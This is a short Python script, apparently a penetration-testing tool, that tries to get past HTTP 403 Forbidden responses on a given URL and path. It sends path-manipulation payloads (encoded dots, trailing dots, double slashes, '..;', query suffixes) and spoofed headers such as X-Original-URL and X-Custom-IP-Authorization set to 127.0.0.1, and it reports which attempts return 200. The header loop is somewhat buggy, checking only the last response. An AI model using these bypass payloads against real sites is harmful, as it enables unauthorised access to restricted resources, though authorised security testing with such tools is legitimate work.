# -*- coding: utf_8 -*-
# bypass 403 code fuzzer
# author: 99

import requests,sys

def bypass(url,path):
    headerspayloads = [{'X-Original-URL': "/"+path},{'X-Custom-IP-Authorization': '127.0.0.1'},{'Referer': "/"+path}]
    payloads = [url + '/' +path,url + '/%2e/' + path,url + '/' + path + '/.',url + '//' + path + '//',url + '/./' + path + '/./',url + '/' + path + '.json',url + '/' + path + '?',url + '/' + path + '..;',url + '/' + path + '??']

    for i in range(0,12):
        if i < 9:
            r = requests.get(payloads[i])
        else:
            for j in range(0,3):
                r = requests.get(url + '/' + path,headers=headerspayloads[j])
        if r.status_code == 200:
            print(i)

if __name__ == '__main__':
    try:
        url,path = sys.argv[1:3]
        bypass(url,path)
    except Exception as e:
        print(sys.argv)
        print(e)